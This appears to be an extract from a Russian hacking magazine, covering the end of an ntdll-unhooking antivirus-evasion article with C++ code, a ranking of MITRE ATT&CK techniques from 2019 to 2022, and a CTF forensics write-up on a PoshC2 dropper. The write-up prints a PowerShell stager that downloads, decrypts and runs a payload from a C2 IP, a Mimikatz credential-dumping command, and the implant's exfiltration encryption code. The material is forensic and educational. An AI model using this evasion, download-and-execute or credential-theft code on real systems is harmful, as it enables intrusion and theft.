            return FALSE;
    }


    DWORD dwOldProtection = NULL;


    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize,
PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
        printf("[!] VirtualProtect [1] Failed With Error : %d \n",
GetLastError());
        return FALSE;
    }


    memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);


    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize,
dwOldProtection, &dwOldProtection)) {
        printf("[!] VirtualProtect [2] Failed With Error : %d \n",
GetLastError());
        return FALSE;
    }


    return TRUE;
}

Об рати внимание, что на функции ReadNtdllFromServer() программа может
как бы зависнуть. Не переживай, она работает, кача ет нужную библиотеку.





                   Успешное скачивание биб лиотеки

Этот способ, думаю, самый удобный. Его главный недостаток в том, что тре-
буется дос туп в интернет со скомпромети рованного хоста.
  Полный код реали зации для тво их собс твен ных экспе риментов я так же
прикладываю:
 • NtdllFromWEbsite.cpp — подгрузка с winbindex.m417z.com;
 • NTDLLReection — под грузка с иного ресурса, ты должен будешь сам под-
   нять веб-сервер.


ÂÛÂÎÄÛ

Пом ни, что анхукинг — это не более чем один из множества способов обхода
хуков. При чем умные антивирусы умеют восста навливать хуки, если обна-
руживают, что кто-то их снял. На любое действие най дется противодействие,
но в данном слу чае это приг лашение к новому действию!
ВЗЛОМ





        СОСТАВЛЯЕМ РЕЙТИНГ
        САМЫХ ПОПУЛЯРНЫХ
           ХАКЕРСКИХ АТАК





Тех ники кибера так совершенс твуются год
от года. Если ты интересуешь ся информа-
цион ной  безопасностью  или  трудишься
в этой сфе ре, важ но быть в курсе, каким                                                                               AK_83
арсе налом   пользуют ся   современ ные           tester-ak@yandex.ru
киберпреступники.  Сегодня  погово рим
о самых популярных в последние годы тех-
никах и средс твах хакеров.


Техника кибератак на компьютер ные системы опре деляет, как действу ют ата-
кующие, и здесь всегда мож но придумать что-нибудь новенькое. В той же
матрице MITRE ATT&CK с 2019 года количес тво техник из 244 трансфор-
мировалось в 196, но теперь они включают 411 субтехник (по состоянию
на тре тий квар тал 2023 года). То есть общее чис ло техник фактически уве-
личи лось вдвое. С другой сто роны, ранее проторенные ата кующими дорожки
никто не отменял. Их тоже активно используют, какие-то чаще, какие-то чуть
реже. Давай попробуем их отыскать.
   Для начала покопаемся в ана литических отчетах, оперирующих  TTP,
за пос ледние несколь ко лет. В качестве наиболее авторитетных репортов мы
будем исполь зовать матери алы от Red Canary,  Trellix, Picus Labs и дру гих
Брай анов Кребсов известных на рын ке ИБ компаний, в том числе российских.
Нач нем с 2019 года, для которого, прав да, доступен толь ко один сводный
отчет — «Threat detection report. First edition | 2019» от Red Canary. Но с каж-
дым годом авторитет ных источни ков станови лось все больше, за 2022 год
име ется с десяток пуб личных репортов.


ÊÀÊ ÎÏÐÅÄÅËßËÑß ÐÅÉÒÈÍÃ

Первый момент, который потребуется учесть: в боль шинстве аналити ческих
отче тов уже исполь зуются агрегированные показа тели, которые нужно кор-
ректно сопоставлять между собой. Мы под считаем занимаемые той или иной
тех никой позиции в имеющихся рейтин гах. Если места заняты субтехниками,
то в расчете учтем ту тех нику, с которой она ассоциирована.
   Нап ример, тех ника T1059 Command and Scripting Interpreter за 2022 год
трижды занимала первое мес то, по одному разу второе, третье и девятое
места. В ито ге она возглавила топ 2022 года.
   Если тебе инте рес на тех ническая сторона воп роса, поясню: массив вход-
ных данных из различных отчетов формировался в ручном режиме (создавал-
ся еди ный CSV-файл), а уже табличные дан ные анализировались с исполь-
зованием библиотеки Pandas для Python.


ÄÈÍÀÌÈÊÀ Ñ 2019-ÃÎ ÏÎ 2022 ÃÎÄ ÂÊËÞ×ÈÒÅËÜÍÎ

2019 ãîä
Начать сто ит с того, что ключевая проб лема здесь не только в нич тожной
выбор ке из единственного отче та, но и в изме нении MITRE ATT&CK за это
вре мя. Дело в том, что, как любой «живой» проект, матрица пос тоянно
обновля ется и с 2019 года сменила не одну вер сию. В результате мне приш-
лось руками перемапить «старые» техники в «новые», а это в том числе пов-
лияло на сок ращение рейтин га с десяти позиций до восьми. Нам интересен
этот топчик в первую очередь как отправ ная точка для дальнейших иссле-
дований. Итак, самые популярные техники 2019 года:
 1. T1059 Command and Scripting Interpreter;
 2. T1218 System Binary Proxy Execution;
 3. T1090 Proxy;
 4. T0865 Spearphishing Attachment;
 5. T1036 Masquerading;
 6. T1003 OS Credential Dumping;
 7. T1547 Boot or Logon Autostart Execution;
 8. T1569 System Services.

На что здесь сто ит обратить вни мание, так это на технику T0865 Spearphishing
Attachment, которая была популярна у крайне активных на тот момент груп-
пировок Carbanak и FIN7, а так же в рамках дру гих целевых кампаний, доля
которых, по мнению ряда исследователей, в 2019 году ста ла превалирующей.
В пос леду ющие годы эта техника также будет присутствовать на радарах,
но уже за пре делами агрегиро ванных топ-10.


2020 ãîä
На сле дующий год хит-парад немного изменился:
 1. T1055 Process Injection;
 2. T1574 Hijack Execution Flow;
 3. T1059 Command and Scripting Interpreter;
 4. T1053 Scheduled Task/Job;
 5. T1562 Impair Defenses;
 6. T1134 Access Token Manipulation;
 7. T1021 Remote Services;
 8. T1003 OS Credential Dumping;
 9. T1036 Masquerading;
10. T1083 File and Directory Discovery.

Здесь, как и в 2019 году, приш лось учесть версион ность мат рицы ATT&CK,
но в меньшем объеме.
   Это первый год пандемии корона вируса и, как следствие, роста популяр-
ности уда ленной работы. В результате среди лидеров появилась тех ника
T1021 Remote Services. Из остальных техник интерес представляет T1574
Hijack Execution Flow, которая чаще всего исполь зуется в сочетании c тех-
никами T1055 Process Injection и T1053 Scheduled Task/Job, что и подтвержда-
ется нашим рейтингом.


2021 ãîä
Рейтинг 2021 года выг лядит следующим обра зом:
 1. T1059 Command and Scripting Interpreter;
 2. T1027 Obfuscated Files or Information;
 3. T1218 System Binary Proxy Execution;
 4. T1055 Process Injection;
 5. T1555 Credentials from Password Stores;
 6. T1543 Create or Modify System Process;
 7. T1083 File and Directory Discovery;
 8. T1486 Data Encrypted for Impact;
 9. T1053 Scheduled Task/Job;
10. T1547 Boot or Logon Autostart Execution.

Ворвавшаяся в топ техника T1486 Data Encrypted for Impact отражает то
рекор дное количество кибератак с использованием программ-шиф роваль-
щиков, которое было зафиксирова но в 2021 году. Свою роль сыграла
и  популяризация  схемы «Шифроваль щик  как  услуга»  (Ransomware  as
a Service, RaaS) на примере следующих вре донос ных программ:
 • Conti;
 • REvil;
 • Avaddon.

Из интересного здесь следует отметить технику T1555  Credentials from
Password Stores, использованную в одной из самых нашумевших кибератак
на цепочку пос тавок SolarWinds.


2022 ãîä
В 2022 году представ лен рас ширенный топ-20, пос кольку это самый инте рес-
ный для нас год и данных было дос таточно для составле ния развернутого
рей тин га.
 1. T1059 Command and Scripting Interpreter;
 2. T1082 System Information Discovery;
 3. T1036 Masquerading;
 4. T1003 OS Credential Dumping;
 5. T1071 Application Layer Protocol;
 6. T1218 System Binary Proxy Execution;
 7. T1083 File and Directory Discovery;
 8. T1588 Obtain Capabilities;
 9. T1047 Windows Management Instrumentation;
10. T1486 Data Encrypted for Impact;
 11. T1190 Exploit Public-Facing Application;
12. T1566 Phishing;
13. T1055 Process Injection;
14. T1021 Remote Services;
15. T1098 Account Manipulation;
16. T1105 Ingress Tool Transfer;
17. T1110 Brute Force;
18. T1547 Boot or Logon Autostart Execution;
19. T1112 Modify Registry;
20. T1505 Server Software Component.

Здесь есть как уже знакомые нам «лица», так и новички. Нап ример, на втором
месте тех ника T1082 System Information Discovery, которая позволя ет ата-
кующему не толь ко грамот но развить кибератаку, но и собрать данные
на будущее, что не может не настораживать.
   Отметим технику T1190 Exploit Public-Facing Application, занявшую 11-е
место, но лидирующую на стадии Initial Access в 2022-м.
   Те перь мож но пос мотреть динамику изме нений в топ-10 за четыре года
на условной теп ловой карте, где более «горячие» техники — это соответс тву-
ющие лидеры.





Круговая диаграмма для техник из топ-10, встречающих ся два и более раз
за четыре года, имеет следующий вид (здесь «Дру гие» — это тех ники, встре-
чающиеся только один раз).





ÄÅÒÀËÜÍÅÅ Î ËÈÄÅÐÀÕ

Работа ющие с матрицей ATT&CK специалис ты навер няка хотели бы увидеть
информацию о суб техни ках, ведь именно они определяют и контекст ата-
куемой ИТ-инфраструк туры, и пред метные век торы атаки. Для этой цели раз-
берем три самые популярные техники за последние годы.


T1059 Command and Scripting Interpreter
Эта техника сох раняла свою позицию в рейтин гах из года в год. И по количес-
тву упоминаний в репор тах различных исследова телей она идет с большим
отры вом. Но при этом тех ника содержит восемь субтехник, из которых
наиболь шую популярность у ата кующих снискали две: T1059.001 и T1059.003.
  С учетом общего тренда импортозаме щения дополнитель но при ведем
экспертный мап пинг с техниками из отечес твен ной Методики оценки угроз
безопасности информации, а точнее, из приложения 11 к ней:
 • Т3.1. Автоматичес кий запуск скриптов и исполняемых файлов в системе
   с исполь зованием пользователь ских или системных учетных данных, в том
   числе с использовани ем методов соци альной инже нерии;
 • Т3.6. Авто мати ческое создание вредонос ных скриптов при помощи дос-
   тупного инс трументария от име ни пользователя в сис теме с исполь-
   зовани ем его учетных данных;
 • Т4.2. Исполь зование штатных средств удаленного доступа и управле ния
   опе рационной системы.


T1059.001 Command and Scripting Interpreter: PowerShell
Под робно  эта суб техника описана на сай те  mitre.org. Почему именно
PowerShell?
   Во-первых, сегодня PowerShell — это кросс-платформенный инстру мент
(да-да, работающий на опе раци онных системах Windows, Linux и macOS). Он
состоит из оболочки командной строки, языка сценариев и сре ды управления
конфигурацией (PowerShell Desired State Conguration). В ИТ-инфраструк-
турах эту технологию уже используют не только сис темные администраторы,
но и DevOps-инженеры, разработ чики, а также инже неры при интегра ции
раз личных сис тем между собой. Как следствие, при менение PowerShell почти
ни у кого не вызывает воп росов.
   Во-вторых, атакующему фактически не нужно загружать и устанавливать
дополнительное программное обеспечение, поскольку PowerShell уже име-
ется по умолчанию на клиентских и серверных опе раци онных сис темах
семей ства Windows начиная с Windows 7 и Windows Server 2008 R2, что
помогает снизить веро ятность его обнаружения на ранней стадии кибера-
таки.
   Атакующий может, скажем, зло употреблять запуском PowerShell-коман-
длетов (Cmdlet), при чем как в рам ках активных действий (тактика Execution,
с которой эта техника ассо циирована), так и на дру гих этапах — сбора данных
о сос тоянии опе рационной системы (нап ример, Get-Process, Get-HotFix), заг-
рузки данных из интернета (например, Invoke-WebRequest) и так далее.
   Кроме того, существуют наступательные инстру менты на базе PowerShell
(нап ример, Empire, PowerSploit).




                    По этой теме написано дос таточно мно го матери-
                          алов: в «Хакере», а еще на  Robwillis.info и у
                           Microsoft.



T1059.003 Command and Scripting Interpreter: Windows Command
Shell
Описание этой суб техники также нетрудно най ти на сай те MITRE. С Windows
Command Shell (cmd), основной командной стро кой в Windows, ситуация ана-
логична PowerShell — это мощный инстру мент, дос тупный по умолчанию.
Коман дная строка может использовать ся для управления практичес ки любым
аспектом опе рационной системы с раз личны ми уровнями разрешений. Плюс
коман дную строку мож но вызывать уда лен но. Нап ример, с помощью под-
готовленных атакующим пакетных фай лов .bat или .cmd.


T1218 System Binary Proxy Execution
Сре ди техник в интер пре тации ФСТЭК Рос сии эта техника ближе всего к сле-
дующей: «Т3.16. Запуск вредоносных прог рамм при помощи легитимных,
под писан ных цифровой под писью утилит уста новки приложений и средств
запуска скриптов (т. н. техника проксирова ния запус ка), а также через средс-
тва запуска кода элементов управления  ActiveX, компонентов филь тров
(кодеков) и ком понен тов библиотек DLL».
   Тех ника содер жит 13 суб техник, из которых чаще всего встре чаются
четыре: T1218.005, T1218.007, T1218.010 и T1218.011. Ключевые раз личия —
в исполь зуемых атакующим ути литах:
 • T1218.005 — mshta.exe;
 • T1218.007 — msiexec.exe;
 • T1218.010 — Regsvr32.exe;
 • T1218.011 — rundll32.exe.


T1036 Masquerading
В номенклатуре ФСТЭК России эта тех ника ближе всего к следующей: «Т7.12.
Манипуляции име нами и парамет рами запуска процес сов и при ложе ний
для обеспечения скрытности».
   Тех ника вклю чает семь суб техник, но массовый характер носят сле-
дующие: T1036.003, T1036.004 и T1036.005. Разница заключа ется в объ ектах,
с которыми атакующий про изводит манипуляции, точнее, в их наиме нованиях:
 • T1036.003: законные системные ути литы, в том числе из предыдущей тех-
   ники T1218 System Binary Proxy Execution;
 • T1036.004: нелегитимные задачи и сервисы, мас кирующиеся под легитим-
   ные;
 • T1036.005: име на вредонос ных файлов или путей к ним, совпадающие
   с легитим ными именами или путями.


ÏÎÄÂÎÄß ÏÐÅÄÂÀÐÈÒÅËÜÍÛÅ ÈÒÎÃÈ

По лученные рей тинги помогут выбрать наибо лее эффективные меры защиты
информации. Принимая во вни мание, что подоб ные отчеты публику ются еже-
год но (а некоторые даже чаще), на их основе можно регулярно актуализиро-
вать сос тав и настрой ки средств защиты информа ции.




                     При выборе мер защиты информа ции имеет
                     смысл использовать раздел мат рицы Enterprise
                            Mitigations и MITRE D3FEND, а так же параллель-
                     ный ATT&CK проект DeTT&CT.



ÏÎÏÓËßÐÍÛÅ ÑÕÅÌÛ ÊÈÁÅÐÀÒÀÊ Â ÐÎÑÑÈÉÑÊÎÌ ÑÅÃÌÅÍÒÅ

Те перь, с уче том информации выше, попробу ем соб рать полную цепочку
кибера таки. Для этого будем использовать при меры популярных в 2022 году
схем кибератак в российском сегменте сети.
   Стадию Reconnaissance детализировать не будем, поскольку она сильно
зависит от конкрет ной ата куемой системы, ее дос тупности из сети и пуб-
личнос ти.
   Стадию Initial Access раз ведем на две: экс плуатация уязвимос тей Microsoft
Exchange ProxyShell и эксплуатация уязвимости Bitrix CVE-2022-27228. Они
и поведут нас по разным вет кам кибератак. При этом оба варианта относятся
к № 11 из пос ледне го списка: T1190 Exploit Public-Facing Application.
   Проник нув в сеть через неп ропатченный Microsoft Exchange, атакующий
раз мещает веб-шелл ( № 20 — T1505.003 Server Software Component: Web
 Shell). В час ти Defense Evasion выполняется остановка, добавление исклю-
чений или очистка журналов аудита событий Microsoft Defender (T1562.001
Impair Defenses: Disable or Modify Tool), а также применяется msiexec (№ 6 —
T1218.007 System Binary Proxy Execution: msiexec). Выход на финишную пря-
мую —  Impact: выкачивание данных с скомпромети рованного  Microsoft
Exchange, но чаще прос то шифрование дисков (№ 10 — T1486 Data Encrypted
 for Impact).
   Путь через непропатченный Bitrix немного короче: размещение готово го
веб-шелла ( № 20 — T1505.003 Server Software Component: Web Shell), а в
качестве Impact — редирект или дефейс (T1491 Defacement).
   Та ким образом, пазл пос тепенно складыва ется, и полученная статистика
не полностью, но в значительной степени покрывает рас смотренные нами
при меры.
   Безусловно, нельзя считать составление подобных рейтингов «сереб-
ряной пулей», но как доступный широкому кругу спе циалис тов механизм
выбора и при ори тизации мер  безопасности он име ет  полное право
на существо вание.
ВЗЛОМ





РАЗБИРАЕМ
ПОСЛЕДСТВИЯ
ЗАРАЖЕНИЯ
ДРОППЕРОМ POSHC2





Зак репле ние, постэкс плу ата ция и эксфиль-
трация — три неотъ емлемых этапа каж дой
атаки. В этой статье мы про ведем рассле-
дование инциден та: поищем  артефакты,
                                                                                  Антон Кузнецовсдам пим сетевой тра фик и деобфусцируем
                                                                                          anton.aleksandrovich65@gmail.com
найденный вредоносный код. Таким обра-
зом мы восстановим действия злоумыш-
ленника и заодно познакомимся с популяр-
ными техниками, которые час то при меня-
ются «в дикой сре де».


Эта статья — райтап по одному из заданий по цифровой форензике с про-
шедшего в марте 2023 года CTF-соревнования на Hack The Box. Уровень —
сложный.
  Наше задание звучит следующим образом:


     «Ìû çàìåòèëè íåîáû÷ íûé òðà ôèê, èñõîäÿùèé èç îòêðû òîãî êîñ ìîñà.
      Íåèç âåñ òíàÿ ãðóï ïà èñïîëüçóåò ñåð âåð Command and Control. Â õîäå«
      âñåñ òîðîííåãî ðàñ ñëå äîâà íèÿ ìû óñòà íîâèëè, ÷òî çàðàæå íî íåñ êîëüêî
      êîìïüþòå ðîâ ó÷å íûõ èç ÷àñ òíîé ëàáîðà òîðèè Pandora. Ìîæåøü óçíàòü,
       êàê ðàáîòà åò ñåð âåð, è âåð íóòü óêðà äåííîå?»                »
То есть мы знаем, что сер вер был скомпрометирован, и у нас есть трафик.
Нас просят про анализи ровать дамп, про вес ти рассле дование инци дента
и установить, как атакующие заг ружали утилиты на скомпромети рованный
сервер, какими спо собами зак реплялись и как производили эксфильтрацию
данных. В конеч ном счете нам нужно будет най ти флаг.


ÈÙÅÌ ÀÐÒÅÔÀÊÒÛ Â ÑÅÒÅÂÎÌ ÒÐÀÔÈÊÅ

Первым делом загрузим дамп в Wireshark. Нес ложно установить, что IP ском-
про метирован ного  сервера  приватный —  192.168.25.140,  в  то  вре мя
как адрес C2-сер вера атакующих пуб личный — 64.226.84.200. Также видно,
что со скомпромети рованного хоста про исходит обра щение к стороннему
ресурсу (C2-серверу) с GET-зап росом по ссылке, которая оканчивается
на vn84.ps1. В ответ сер вер отдает сценарий на PowerShell.





    GET-запрос со скомпромети рован ного хос та для загрузки vn84.ps1

Трафик передается по HTTP, то есть без шиф рования. Это зна чит, что мы
можем экспортировать передан ные объ екты из дам па и подробно их изу чить,
чтобы вос становить ход ата ки, а также определить, какие методы и ути литы
использовали ата кующие. Для это го в меню выбираем «Файл → Экспор-
тировать объекты → HTTP». Жмем «Сохранить все» и задаем конечную
директорию.





             Эк спортированные из дампа трафика объекты


ÈÇÓ×ÀÅÌ ÀÐÒÅÔÀÊÒÛ

В глаза сразу бро сается экспортирован ный сце нарий PowerShell, однако,
чтобы получить полную картину, нужно определить, с артефактами какого
формата нам предстоит работать. Поэто му не будем бросаться изучать най-
денные скрип ты, а первым делом посмотрим, что за формат у остальных
экспортированных файлов. Для этого восполь зуем ся утилитой le и коман-
длетом Get-ChildItem. Обойдем все файлы в цикле:


foreach ($file in (Get-ChildItem $_.Name))





               Формат экспор тированных фай лов

Запишем полученный мас сив в переменную $fileformat, а в новом цик ле
пере име нуем фай лы с рас ширением PNG, чтобы пос мотреть, что внутри.


foreach ($format in $fileformat) }

Интересного в самих картинках мало (это изображения собак в низком раз-
решении), однако вни мание привлекает файл %3fdVfhJmc2ciKvPOC(23).png,
пос коль ку его размер больше других — 827 Кбайт. Похоже, помимо картинки,
в нем есть что-то еще. Возьмем этот факт на заметку и будем двигаться даль-
ше. Поглядим, что в других файлах.





                      Получен ные PNG

Файлы раз мером око ло 1 Кбайт — отве ты сер вера на запросы («200 OK»
и другие коды), и интереса такие данные для нас не представляют. Остальные
файлы име ют малоразличимое содержимое, их пока оставим, а вот экспор-
тированный сце нарий  PowerShell вполне читабельный,  хоть и нем ного
обфусцирован. Попробу ем разобраться, что происходит в коде.
   Изучая vn84.ps1, мож но увидеть обфусци рованные коман длеты.





            Об фусцированное содер жимое vn84.ps1

Здесь атакующие исполь зуют обфускацию строк, подробнее об этой и других
тех никах мож но узнать из доклада на Black Hat 2017 (PDF).
  Для деобфускации можно пой ти несколькими путями: воспользоваться
инструментом PSDecode, использовать журнал Windows при включенном
аудите сценариев  PowerShell,  ну или попросить разоб раться ChatGPT,
который тоже уме ет деоб фусцировать, хоть иногда и меняет исходный код
на свое усмотре ние.
  Я вос поль зуюсь PSDecode. После деоб фуска ции получаем исходный сце-
нарий (некоторые строки я подпра вил вручную):


Set-Item 'Variable:QLz0so' ([type]('System.IO.FileMode'))
Set-Variable -Name l60Yu3 -Value ([type]('System.Security.
Cryptography.AesCryptoServiceProvider'))
Set-Variable -Name BI34 -Value ([type]('System.Security.Cryptography.
CryptoStream'))
$Url = 'http://64.226.84.200/94974f08-5853-41ab-938a-ae1bd86d8e51'
$PTF = "$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51"
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $path
Invoke-WebRequest -Uri $Url -OutFile $PTF
$Fs = New-Object -TypeName 'System.IO.FileStream'($PTF , ([System.IO.
FileMode]::Open))
$MS = New-Object -TypeName 'System.IO.MemoryStream'
$aes = [System.Security.Cryptography.AesCryptoServiceProvider]::
Create()
$aes.KeySize = 128
$KEY = [byte[]] (0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0)
$iv = [byte[]] (0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)
$aes .Key = $KEY
$aes .IV = $iv
$cs = New-Object -TypeName 'System.Security.Cryptography.
CryptoStream'($MS , $aes.CreateDecryptor() , ([System.Security.
Cryptography.CryptoStreamMode]::Write))
$fs.CopyTo($cs)
$decD = $MS.ToArray()
$CS.Write($decD , 0, $decD.Length)
$decD | Out-File -Path "$env:temp\tmp7102591.exe" -Encoding Byte
& "$env:temp\tmp7102591.exe"

Становит ся понят нее. Если корот ко: PowerShell-скрипт здесь при помощи
системной службы Windows BitsTransfer (T1197 по матрице ATT&CK) передает
данные с C2-сервера. Они загружаются на скомпро метированный хост, пос-
ле чего расшифро вываются по алгоритму AES-CBC-128. Для расшифровки
AES c CBC-mode необходимы ключ и вектор инициализации, они как раз
и указаны в сце нарии.
   Рас шифрован ные бай ты записывают ся в исполняемый файл $env:temp\
tmp7102591.exe, а затем этот файл запус кается. Наша первоочеред ная
цель — расшифровать данные и записать их в исполняемый файл для даль-
нейше го изучения. Это поможет узнать, что происхо дило на эта пе закрепле-
ния.
  Для дешифровки можем воспользовать ся тем же сце нари ем или инс тру-
ментом CyberChef (но это более трудоемкий способ).
  Из значения перемен ной $Url в сценарии следует, что расшифровывать
нуж но поток бай тов в дампе трафика с именем 94974f08-5853-41ab-938a-
ae1bd86d8e51.




                       Чтобы убедиться, что работа ведется с верным
                        пакетом,  номер  пакета  можно  сопоставить
                        с номером экспортиру емо го объекта Wireshark.


Итак, все переданные файлы уже экспор тирова ны, алгоритм, ключ и век тор
у нас на руках. Получается, дело за малым: нужно лишь рас шифро вать данные
и записать их в файл. Рас шифровывать мы будем тем же сце нари ем vn84.
ps1, толь ко перед запуском нем ного его перепишем:
 1. Удалим стро ки, в которых используется BitsTransfer.
 2. Исправим  путь, по которому  будет  счи тываться  загружаемый файл
   (переменная $PTF), на путь, куда мы экспортирова ли объекты из дампа
   трафика. То есть укажем полный путь до экспортированного фай ла
  94974f08-5853-41ab-938a-ae1bd86d8e51.
 3. Удалим пос леднюю строку, в которой исполняется файл (нам это сейчас
   ни к чему).
 4. Также для удобства поиска расшифрован ного файла в сис теме сменим
  Out-File  на  Set-Content,  а  путь  $env:temp\tmp7102591.exe
   на необходимый нам и зададим кодировку -Encoding Byte.

Итоговый сценарий будет выглядеть так:


$PTF = "C:\Users\Antony\Desktop\C2Interstellar_HTB\C
2_Interstellar_CTF_Task\WShark 2\9
4974f08-5853-41ab-938a-ae1bd86d8e51"
$Fs = New-Object -TypeName 'System.IO.FileStream'($PTF , ([System.IO.
FileMode]::Open))
$MS = New-Object -TypeName 'System.IO.MemoryStream'
$aes = [System.Security.Cryptography.AesCryptoServiceProvider]::
Create()
$aes.KeySize = 128
$KEY = [byte[]] (0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0)
$iv = [byte[]] (0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)
$aes .Key = $KEY
$aes .IV = $iv
$cs = New-Object -TypeName 'System.Security.Cryptography.
CryptoStream'($MS , $aes.CreateDecryptor() , ([System.Security.
Cryptography.CryptoStreamMode]::Write))
$fs.CopyTo($cs)
$decD = $MS.ToArray()
$CS.Write($decD , 0, $decD.Length)
$decD | Set-Content -Path "C:\Users\Antony\Desktop\C2Interstellar_HTB
\C2_Interstellar_CTF_Task\tmp7102591.exe" -Encoding Byte

Те перь выполним наш скрипт и получим исполня емый файл tmp7102591.exe.
  С помощью утилиты Detect It Easy мы можем убедиться, что файл не был
запакован. Следом откроем его в dnSpy, что бы под робнее изучить код.





        Иссле дование исполняемого файла на наличие пакера





                  Исходный код tmp7102591.exe




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ





             РАЗБИРАЕМ ПОСЛЕДСТВИЯ ЗАРАЖЕНИЯ
                         ДРОППЕРОМ POSHC2





ÎÁÂÅØÈÂÀÅÌÑß ÁÐßÊÀÌÈ

Ис ходное название файла — dropper_cs.exe. Настало время навешать
брейк-пойнты и подать на вход экспортированные фай лы, которые не уда-
лось изучить раньше. Это поз волит нам узнать, как работает дроппер.
  Для взаимо дей ствия с сервером используется функция GetWebRequest(),
с ее помощью атакующие как скачивают данные с сервера, так и отправ ляют
туда поль зовательскую информацию с хос та жер твы, предварительно обра-
ботав ее (как именно — разберемся дальше). Во вре мя скачивания на ском-
про метирован ный хост доставляются дополнительные инс трументы, которые
будут использованы для раз вития атаки. Давай под робнее пос мотрим,
как происходит дос тавка информации на машину жертвы.
  После запуска файла dropper_cs.exe выпол няет ся первый GET-запрос
на С2-сервер атакующих (http://64.226.84.200:8080) с роутом /Kettie/
Emmie/Anni?Theda=Merrilee?c. Этот файл мы уже экспортировали, поэтому
считаем данные из него методом ReadAllText() класса File, а строку зап-
роса к серверу закомментируем. Вооб ще, можно закомментировать всю
функцию GetWebRequest(), так как необ ходимости в ней больше нет. И уста-
новим точку останова на строке 310, чтобы посмотреть, как выглядит рас-
шифрованная информация.





         Расшифрован ные данные пакета Anni?Theda=Merrilee?c

Пос ле успешной дешиф ровки текст выше чистится регулярками, и мы в итоге
получаем:
 • список роутов (по ним в дальнейшем будет зап рашиваться вся необ-
   ходимая информация с сервера, дополнительный инс трументарий и про-
   чее);
 • дату (если она меньше текущей, имплант запущен не будет);
 • время сна;
 • джиттер задер жки для последующих запросов GET и POST;
 • íî âûé êëþ÷ øèô ðîâàíèÿ;
 • implant — набор картинок в PNG, которые мы уже видели, в фор мате
   Base64.

По лученные данные видно на рисунке ниже.





            Расшифро ванные и деобфусцированные данные

Вся  полученная  информа ция  переда ется  через  аргу менты  функции
ImplantCore(), которая отвечает за внедрение кода.
  В этой функции атакующие GET-зап росами получают допол нительный
исполняемый  код,  расшифровывают  его  при  помощи  нового  ключа
и исполняют на ском про метированном хосте с опре деленными параметрами
без записи в файл (то есть это бесфайловая атака).
  Давай расшифруем файлы, чтобы определить, какие инс трументы заг-
рузили злоумышленники. Для это го вмес то заг рузки с сервера считаем дан-
ные из экспортированного фай ла %3fdVfhJmc2ciKvPOC и расшифруем его,
а потом запишем байт-код в новый файл First_Decr.exe.
  Посчитаем хеш получив шегося файла и отпра вим на VirusTotal.





           Провер ка рас шифрован ного фай ла на VirusTotal

Файл — не что иное, как PoshC2, фрей мворк для закрепле ния и постэксплу-
ата ции. Отлично!
   Аналогич ным образом попробуем рас шифровать следующий экспор-
тированный файл — %3fdVfhJmc2ciKvPOC(14). После дешифровки получаем
SharpSploit.dll — биб лиотеку для пос тэкс плуата ции, которая позволяет
дампить креды из lsass.exe. Она запускается со следующими аргу ментами:


run-dll SharpSploit.Credentials.Mimikatz SharpSploit Command
"privilege::debug sekurlsa::logonPasswords"

Запуск происхо дит в коман дной стро ке cmd в функции stringBuilder.
AppendLine(Program.rAsm(cmd)).





                                   SharpSploit.dll

Пос ле выпол нения кода SharpSploit.dll со ском прометированного сер-
вера резуль тат нап равлялся на сервер C2, но прежде закодированные
в Base64 данные обрабатывают ся. Они конверти руются в массив байтов,
затем сжи мают ся при помощи Gzip и шифруют ся следующей функцией:


private static string Encryption(string key, string un, bool comp =
false, byte[] unByte = null)
{
  byte[] array = null;
  if (unByte != null)
  {
      array = unByte;
  }
  else
  {
      array = Encoding.UTF8.GetBytes(un);
  }
  if (comp)
  {
      array = Program.Compress(array);
  }
  string text;
  try
  {
      SymmetricAlgorithm symmetricAlgorithm = Program.CreateCam(key,
null, true);
      byte[] array2 = symmetricAlgorithm.CreateEncryptor().
TransformFinalBlock(array, 0, array.Length);
      text = Convert.ToBase64String(Program.Combine(
symmetricAlgorithm.IV, array2));
  }
  catch
  {
      SymmetricAlgorithm symmetricAlgorithm2 = Program.CreateCam(key,
null, false);
      byte[] array3 = symmetricAlgorithm2.CreateEncryptor().
TransformFinalBlock(array, 0, array.Length);
      text = Convert.ToBase64String(Program.Combine(
symmetricAlgorithm2.IV, array3));
  }
  return text;
}

Пос ле это го к данным добавляются случай ные 1500 байт и полученная
на пер вом этапе кар тинка.


internal static byte[] GetImgData(byte[] cmdoutput)
{
  int num = 1500;
  int num2 = cmdoutput.Length + num;
  string text = Program.ImgGen._newImgs[new Random().Next(0, Program.
ImgGen._newImgs.Count)];
  byte[] array = Convert.FromBase64String(text);
  byte[] bytes = Encoding.UTF8.GetBytes(Program.ImgGen.RandomString(
num - array.Length));
  byte[] array2 = new byte[num2];
  Array.Copy(array, 0, array2, 0, array.Length);
  Array.Copy(bytes, 0, array2, array.Length, bytes.Length);
  Array.Copy(cmdoutput, 0, array2, array.Length + bytes.Length,
cmdoutput.Length);
  return array2;
}

Это как раз та кар тинка, необычный раз мер которой мы уже подметили
в начале рассле дования.
  Настало вре мя изучить подробнее файл %3fdVfhJmc2ciKvPOC(23).png.
Пос мотрим на его содержимое в Hex-редакторе HxD.





  Шестнадцатеричное пред ставление файла
  %3fdVfhJmc2ciKvPOC(23).png

В заголов ке видим PNG, а также что пос ле окончания PNG идут другие дан-
ные.





Что бы узнать, что скрыто в данных, напишем свой декриптор.


ÏÈØÅÌ ÄÅÊÐÈÏÒÎÐ

Зная алгоритм пре образования данных, поп робуем декоди ровать информа-
цию. Для это го возьмем имеющиеся в коде функции:
 • Decrypt() — дешифрует данные AES-CBC-128, немного изменив фун-
   кцию, добавив в нее декомпрес сию методом Gzip и убрав лишнее пре-
   образование из массива байтов в текст;
 • CreateCam() — слу жит для создания алго ритма с ключом и вектором;
 • Decompress() — для разархивирования дан ных методом Gzip.

В конце декоди руем мас сив бай тов в стро ку методом Encoding.ASCII.
GetString().
  В конеч ном сче те преобра зуем из Base64 и запишем получившийся
байт-код в файл decrypted_image.png.
